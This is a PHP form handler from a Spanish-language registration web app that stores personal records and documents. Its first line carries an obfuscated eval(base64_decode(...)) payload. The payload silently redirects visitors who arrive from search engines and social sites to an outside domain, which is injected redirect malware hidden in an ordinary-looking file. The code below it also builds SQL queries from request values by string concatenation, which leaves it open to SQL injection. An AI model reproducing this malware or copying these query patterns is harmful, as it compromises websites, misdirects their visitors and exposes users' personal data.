<?php	 	eval(base64_decode("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikpewppZiAoc3RyaXN0cigkcmVmZXJlciwieWFob28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaW5nIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlciIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImdvZ28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpb3Igc3RyaXN0cigkcmVmZXJlciwiYXBvcnQiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJuaWdtYSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiZWd1bi5ydSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInN0dW1ibGV1cG9uLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpdC5seSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInRpbnl1cmwuY29tIikgb3IgcHJlZ19tYXRjaCgiL3lhbmRleFwucnVcL3lhbmRzZWFyY2hcPyguKj8pXCZsclw9LyIsJHJlZmVyZXIpIG9yIHByZWdfbWF0Y2ggKCIvZ29vZ2xlXC4oLio/KVwvdXJsXD9zYS8iLCRyZWZlcmVyKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJteXNwYWNlLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImFvbC5jb20iKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewpoZWFkZXIoIkxvY2F0aW9uOiBodHRwOi8va21scHMubXJzbG92ZS5jb20vIik7CmV4aXQoKTsKfQp9Cn0KfQp9")); session_start();

/*if(isset($_GET['paso']))
{
	if($_GET['paso'] == '1')
	{
		$_SESSION['paso'] = 1;
		header('Location: index.php?webpage=4'); 
	}else if($_GET['paso'] == '2')
	{
		$_SESSION['paso'] = 2;
		header('Location: index.php?webpage=4');
	}
}*/
if($_SERVER["REQUEST_METHOD"] == "GET")
{

	if(isset($_GET['return']))
	{
		$_SESSION['paso']--;
		if($_SESSION['paso'] == 0) unset($_SESSION['paso']);
		header('Location: index.php?webpage=4');
	}

	if(isset($_GET['doc_codigo']))
	{
		$_SESSION['Doc_Codigo_F'] = $_GET['doc_codigo'];
		$_SESSION['Doc_Tipo_F'] = $_GET['doc_tipo'];
		//$_SESSION['tab'] = $_GET['doc_tipo'];
		header('Location: index.php?webpage=4');
	}

}
else if($_SERVER["REQUEST_METHOD"] == "POST")
{
	require_once 'lib/function_gen.php';

	if(isset($_POST['nro_ident_bal1_hidden']))
	{
		$calle       = htmlspecialchars((strip_tags($_POST["calle_bal1"])));
		$edificio    = htmlspecialchars((strip_tags($_POST["edif_bal1"])));

		$data = CRUDDocumento($_SESSION['Doc_Codigo'], null, null, null, null, 
			null, null, null, null, null, null, null, null, null, null, null, 5);
		$data = $data[0];

		if(CRUDDocumento($_SESSION['Doc_Codigo'], $data['BMP_CodigoEst'], $_POST['select_par1'],
			$calle."@@".$edificio, 1, $data['nro_identificacion'], $data['Per_Codigo'],
			$data['BMP_CodigoBan'], $data['Pai_CodigoParrFis'], $data['Doc_DireccFis'],
			$data['Doc_PgFechaConf'], $data['Doc_PgFechaIns'], $data['Doc_PgSoporte'],
			$data['Per_Codigo2'], $data['Per_CodigoPg'], $data['Doc_Track'], 3))
		{
			$data = fnc_ejecutaQuery("SELECT Doc_PgMonto 
				FROM mp_Documento_Doc 
				WHERE Doc_Codigo = ".$_SESSION['Doc_Codigo']);
			
			if($data[0]['Doc_PgMonto'])
			{
				$_SESSION['Doc_Monto'] = $data[0]['Doc_PgMonto'];
				$_SESSION['paso'] = 1;
				$_SESSION['Doc_Tipo'] = 1;
			}
			header('Location: index.php?webpage=4');
		}
	}else if(isset($_POST['nro_ident_cony1_hidden'])){

		$calle       = htmlspecialchars((strip_tags($_POST["calle_bal2"])));
		$edificio    = htmlspecialchars((strip_tags($_POST["edif_bal2"])));

		$data = CRUDDocumento($_SESSION['Doc_Codigo'], null, null, null, null, 
			null, null, null, null, null, null, null, null, null, null, null, 5);
		$data = $data[0];

		if(CRUDDocumento($_SESSION['Doc_Codigo'], $data['BMP_CodigoEst'], $_POST['select_par2'],
			$calle."@@".$edificio, 2, $data['nro_identificacion'], $data['Per_Codigo'],
			$data['BMP_CodigoBan'], $data['Pai_CodigoParrFis'], $data['Doc_DireccFis'],
			$data['Doc_PgFechaConf'], $data['Doc_PgFechaIns'], $data['Doc_PgSoporte'],
			$data['Per_Codigo2'], $data['Per_CodigoPg'], $data['Doc_Track'], 3))
		{
			$data = fnc_ejecutaQuery("SELECT Doc_PgMonto 
				FROM mp_Documento_Doc 
				WHERE Doc_Codigo = ".$_SESSION['Doc_Codigo']);
			
			if($data[0]['Doc_PgMonto'])
			{
				$_SESSION['Doc_Monto'] = $data[0]['Doc_PgMonto'];
				$_SESSION['paso'] = 1;
				$_SESSION['Doc_Tipo'] = 2;
			}
			header('Location: index.php?webpage=4');
		}
	}else if(isset($_POST['nro_ident_bal3_hidden'])){

		$calle       = htmlspecialchars((strip_tags($_POST["calle_bal3"])));
		$edificio    = htmlspecialchars((strip_tags($_POST["edif_bal3"])));

		$data = CRUDDocumento($_SESSION['Doc_Codigo'], null, null, null, null, 
			null, null, null, null, null, null, null, null, null, null, null, 5);
		$data = $data[0];

		if(CRUDDocumento($_SESSION['Doc_Codigo'], $data['BMP_CodigoEst'], $_POST['select_par3'],
			$calle."@@".$edificio, 3, $data['nro_identificacion'], $data['Per_Codigo'],
			$data['BMP_CodigoBan'], $data['Pai_CodigoParrFis'], $data['Doc_DireccFis'],
			$data['Doc_PgFechaConf'], $data['Doc_PgFechaIns'], $data['Doc_PgSoporte'],
			$data['Per_Codigo2'], $data['Per_CodigoPg'], $data['Doc_Track'], 3))
		{
			$data = fnc_ejecutaQuery("SELECT Doc_PgMonto 
				FROM mp_Documento_Doc 
				WHERE Doc_Codigo = ".$_SESSION['Doc_Codigo']);
			
			if($data[0]['Doc_PgMonto'])
			{
				$_SESSION['Doc_Monto'] = $data[0]['Doc_PgMonto'];
				$_SESSION['paso'] = 1;
				$_SESSION['Doc_Tipo'] = 3;
			}
			header('Location: index.php?webpage=4');
		}
	}else if(isset($_POST['ci_rif'])){

		$nombre_persona   = htmlspecialchars(strip_tags($_POST["nombre_per"]));
		$apellido_persona = htmlspecialchars(strip_tags($_POST["apellido_per"]));
		$ci_persona       = htmlspecialchars(strip_tags($_POST["ci_rif"]));
		$telef_persona    = htmlspecialchars(strip_tags($_POST["telef_bal1"]));
		$image_ci         = htmlspecialchars(strip_tags($_POST["per_imgci_bal1"]));
		$profesion        = htmlspecialchars(strip_tags($_POST["profesion_bal1"]));
		$actividad        = htmlspecialchars(strip_tags($_POST["actividad_com_bal1"]));
                
                $fecha = explode('/',$_POST["fecha_bal1"]);
                $fecha =  $fecha[2] . '-' . $fecha[1] . '-' .$fecha[0];
		$query = "SELECT Per_Codigo FROM mp_Persona_Per WHERE Per_CI = '$ci_persona'";
		$data = fnc_ejecutaQuery("SELECT Per_Codigo FROM mp_Persona_Per WHERE Per_CI = '$ci_persona'");
		if($data)
		{
			if($image_ci)
			{
				$query = "UPDATE mp_Persona_Per SET Per_ImgCI = '$image_ci' WHERE Per_CI = '$ci_persona'";
				fnc_ejecutaSimpleQuery($query);
			}
			
			if(CRUDDocumento(0, 1, null, null, 1, $_SESSION['g_usuario']['nro_identificacion'], $data[0]['Per_Codigo'], null, null, null, null, $fecha, null, null, null, null, 2))
			{
				$_SESSION['Per_Codigo'] = $data[0]['Per_Codigo'];
				$data = fnc_ejecutaQuery("SELECT Doc_Codigo 
					FROM mp_Documento_Doc 
					WHERE nro_identificacion = ".$_SESSION['g_usuario']['nro_identificacion']." AND BMP_CodigoEst = 1;");
				$_SESSION['Doc_Codigo'] = $data[0]['Doc_Codigo'];
				echo "$ci_persona";
			}else echo "fail";
		}else{

			if(CRUDPersona(0, $_SESSION['g_usuario']['nro_identificacion'], $ci_persona, $nombre_persona, $apellido_persona, $profesion, $actividad,$image_ci, $telef_persona, 2))
			{
				$data = fnc_ejecutaQuery("SELECT Per_Codigo FROM mp_Persona_Per WHERE Per_CI = '$ci_persona'");

				if(CRUDDocumento(0, 1, null, null, 1, $_SESSION['g_usuario']['nro_identificacion'], $data[0]['Per_Codigo'], null, null, null, null, $fecha, null, null, null, null, 2))
				{
					$_SESSION['Per_Codigo'] = $data[0]['Per_Codigo'];
					$data = fnc_ejecutaQuery("SELECT Doc_Codigo 
						FROM mp_Documento_Doc 
						WHERE nro_identificacion = ".$_SESSION['g_usuario']['nro_identificacion']." AND BMP_CodigoEst = 1;");
					$_SESSION['Doc_Codigo'] = $data[0]['Doc_Codigo'];
					echo "$ci_persona";
				}else echo "fail";
			}else echo "fail";
		}

	}else if(isset($_POST['ci_rif_ret'])){

		$ci_persona = htmlspecialchars((strip_tags($_POST["ci_rif_ret"])));
		$data = fnc_ejecutaQuery("SELECT Per_Nombre, Per_Apellido, BMP_CodigoPro, Per_ActComerci, Per_Telefono, Per_ImgCI 
			FROM mp_Persona_Per 
			WHERE Per_CI = '$ci_persona' AND nro_identificacion = ".$_SESSION['g_usuario']['nro_identificacion']);

		if($data)
		{
			$data2 = fnc_ejecutaQuery("SELECT Doc_Codigo 
					FROM mp_Documento_Doc 
					WHERE nro_identificacion = ".$_SESSION['g_usuario']['nro_identificacion']." AND BMP_CodigoEst = 1 AND Doc_Tipo = 1;");

			/*if(!$data2)
				CRUDDocumento(0, 1, null, null, 1, $_SESSION['g_usuario']['nro_identificacion'], $data[0]['Per_Codigo'], null, null, null, null, null, null, null, null, null, 2);*/

			/*$data3 = fnc_ejecutaQuery("SELECT Doc_Codigo FROM mp_Documento_Doc WHERE nro_identificacion = ".$_SESSION['g_usuario']['nro_identificacion']." AND BMP_CodigoEst = 1;");*/

			$_SESSION['Per_Codigo'] = $data[0]['Per_Codigo'];
			//$_SESSION['Doc_Codigo'] = $data3['Doc_Codigo'];
			echo $data[0]['Per_Nombre']."@@".$data[0]['Per_Apellido']."@@".$data[0]['BMP_CodigoPro']."@@".$data[0]['Per_ActComerci']."@@".$data[0]['Per_Telefono']."@@".$data[0]['Per_ImgCI'];
		}else echo "";
	}else if(isset($_POST['ci_cony1'])){

		$ci_cony1  = htmlspecialchars((strip_tags($_POST["ci_cony1"])));
		$nom_cony1 = htmlspecialchars((strip_tags($_POST["nombre_cony1"])));
		$ape_cony1 = htmlspecialchars((strip_tags($_POST["apellido_cony1"])));
		$tel_cony1 = htmlspecialchars((strip_tags($_POST["telefono_cony1"])));
		$image_ci1 = htmlspecialchars(strip_tags($_POST["per_imgci_bal2"]));
		$ci_cony2  = htmlspecialchars((strip_tags($_POST["ci_cony2"])));
		$nom_cony2 = htmlspecialchars((strip_tags($_POST["nombre_cony2"])));
		$ape_cony2 = htmlspecialchars((strip_tags($_POST["apellido_cony2"])));
		$tel_cony2 = htmlspecialchars((strip_tags($_POST["telefono_cony2"])));
		$image_ci2 = htmlspecialchars(strip_tags($_POST["per_imgci_bal3"]));
		$profesion_cony1 = htmlspecialchars(strip_tags($_POST["profesion_cony1"]));
		$actividad_cony1 = htmlspecialchars(strip_tags($_POST["actividad_cony1"]));
		$profesion_cony2 = htmlspecialchars(strip_tags($_POST["profesion_cony2"]));
		$actividad_cony2 = htmlspecialchars(strip_tags($_POST["actividad_cony2"]));

                $fecha = explode('/',$_POST["fecha_bal2"]);
                $fecha =  $fecha[2] . '-' . $fecha[1] . '-' .$fecha[0];
		$error = "";

		$data_cony1 = fnc_ejecutaQuery("SELECT Per_Codigo FROM mp_Persona_Per WHERE Per_CI = '$ci_cony1'");
		$data_cony2 = fnc_ejecutaQuery("SELECT Per_Codigo FROM mp_Persona_Per WHERE Per_CI = '$ci_cony2'");

		if(!$data_cony1)
		{
			if(!CRUDPersona(0, $_SESSION['g_usuario']['nro_identificacion'], $ci_cony1, $nom_cony1, $ape_cony1, $profesion_cony1, $actividad_cony1, $image_ci1, $tel_cony1, 2))
				$error .= "Primer registro no pudo ser creado<br>";
				
		}else if($image_ci1){
			
			$query = "UPDATE mp_Persona_Per SET Per_ImgCI = '$image_ci1' WHERE Per_CI = '$ci_cony1'";
			fnc_ejecutaSimpleQuery($query);
		}
				
		if(!$data_cony2)
		{
			if(!CRUDPersona(0, $_SESSION['g_usuario']['nro_identificacion'], $ci_cony2, $nom_cony2, $ape_cony2, $profesion_cony2, $actividad_cony2, $image_ci2, $tel_cony2, 2))
				$error .= "Segundo registro no pudo ser creado<br>";
		}else if($image_ci2){
			
			$query = "UPDATE mp_Persona_Per SET Per_ImgCI = '$image_ci2' WHERE Per_CI = '$ci_cony2'";
			fnc_ejecutaSimpleQuery($query);
		}
			
		if(!$data_cony1)
			$data_cony1 = fnc_ejecutaQuery("SELECT Per_Codigo FROM mp_Persona_Per WHERE Per_CI = '$ci_cony1'");

		if(!$data_cony2)
			$data_cony2 = fnc_ejecutaQuery("SELECT Per_Codigo FROM mp_Persona_Per WHERE Per_CI = '$ci_cony2'");

		if(!CRUDDocumento(0, 1, null, null, 2, $_SESSION['g_usuario']['nro_identificacion'], $data_cony1[0]['Per_Codigo'], null, null, null, null, 
			$fecha, null, $data_cony2[0]['Per_Codigo'], null, null, 3))
			$error .= "Tercer registro no pudo ser creado<br>";
		else{
			$_SESSION['Per_Codigo'] = $data[0]['Per_Codigo'];
			$data = fnc_ejecutaQuery("SELECT Doc_Codigo 
				FROM mp_Documento_Doc 
				WHERE nro_identificacion = ".$_SESSION['g_usuario']['nro_identificacion']." AND BMP_CodigoEst = 1 AND Doc_Tipo = 2;");
			$_SESSION['Doc_Codigo'] = $data[0]['Doc_Codigo'];
		}

		if($error != "") echo $error;
		else echo $ci_cony1."@@".$ci_cony2;

	}else if(isset($_POST['ci_cert'])){

		$ci_cert   = htmlspecialchars((strip_tags($_POST["ci_cert"])));
		$nom_cert  = htmlspecialchars((strip_tags($_POST["nombre_cert"])));
		$ape_cert  = htmlspecialchars((strip_tags($_POST["apellido_cert"])));
		$tel_cert  = htmlspecialchars((strip_tags($_POST["telefono_cert"])));
		$act_cert  = htmlspecialchars((strip_tags($_POST["actividad_com_bal3"])));
		$prof_cert = htmlspecialchars((strip_tags($_POST["prof_cert"])));
		$image_ci  = htmlspecialchars(strip_tags($_POST["per_imgci_bal4"]));
                
                $fecha = explode('/',$_POST["fecha_bal3"]);
                $fecha =  $fecha[2] . '-' . $fecha[1] . '-' .$fecha[0];

		$error = "";

		//$data = fnc_ejecutaQuery("SELECT BMP_Nombre FROM mp_BasicoMP_BMP WHERE BMP_Codigo = $prof_cert;");

		$data = fnc_ejecutaQuery("SELECT Per_Codigo FROM mp_Persona_Per WHERE Per_CI = '$ci_cert'");

		if(!$data)
			CRUDPersona(0, $_SESSION['g_usuario']['nro_identificacion'], $ci_cert, $nom_cert, $ape_cert, $prof_cert, $act_cert, $image_ci , $tel_cert, 2);
		else if($image_ci){
			
			$query = "UPDATE mp_Persona_Per SET Per_ImgCI = '$image_ci' WHERE Per_CI = '$ci_cert'";
			fnc_ejecutaSimpleQuery($query);
		}

		$data = fnc_ejecutaQuery("SELECT Per_Codigo FROM mp_Persona_Per WHERE Per_CI = '$ci_cert'");

		if(CRUDDocumento(0, 1, null, null, 3, $_SESSION['g_usuario']['nro_identificacion'], $data[0]['Per_Codigo'], null, null, null, null, $fecha, null, null, null, null, 2))
		{
			$_SESSION['Per_Codigo'] = $data[0]['Per_Codigo'];
			$data = fnc_ejecutaQuery("SELECT Doc_Codigo 
				FROM mp_Documento_Doc 
				WHERE nro_identificacion = ".$_SESSION['g_usuario']['nro_identificacion']." AND BMP_CodigoEst = 1 AND Doc_Tipo = 3;");
			$_SESSION['Doc_Codigo'] = $data[0]['Doc_Codigo'];
			echo "$ci_cert";
		}else echo "fail";

	}else if(isset($_POST['ci_reporta'])){

		$ci_reporta  = htmlspecialchars((strip_tags($_POST["ci_reporta"])));
		$nom_reporta = htmlspecialchars((strip_tags($_POST["nombre_reporta"])));
		$ape_reporta = htmlspecialchars((strip_tags($_POST["apellido_reporta"])));
		$tel_reporta = htmlspecialchars((strip_tags($_POST["telef_reporta"])));
		$profesion_reporta = htmlspecialchars((strip_tags($_POST["profesion_reporta"])));
		$actividad_com_reporta = htmlspecialchars((strip_tags($_POST["actividad_com_reporta"])));

		$error = "";
		
		$data = fnc_ejecutaQuery("SELECT Per_Codigo FROM mp_Persona_Per WHERE Per_CI = '$ci_reporta'");
		
		if(!$data)
			CRUDPersona(0, $_SESSION['g_usuario']['nro_identificacion'], $ci_reporta, $nom_reporta, $ape_reporta, $profesion_reporta, $actividad_com_reporta, 'no_foto.jpg', $tel_reporta, 2);

		$data = fnc_ejecutaQuery("SELECT Per_Codigo FROM mp_Persona_Per WHERE Per_CI = '$ci_reporta'");
		$doc_codigo = $_SESSION['Doc_Codigo'];
		$pg_codigo  = $data[0]['Per_Codigo'];

		if(fnc_ejecutaSimpleQuery("UPDATE mp_Documento_Doc SET Per_CodigoPg = $pg_codigo WHERE Doc_Codigo = $doc_codigo;"))
			echo "$ci_cert";
		else 
			echo "fail";
	}
}

?>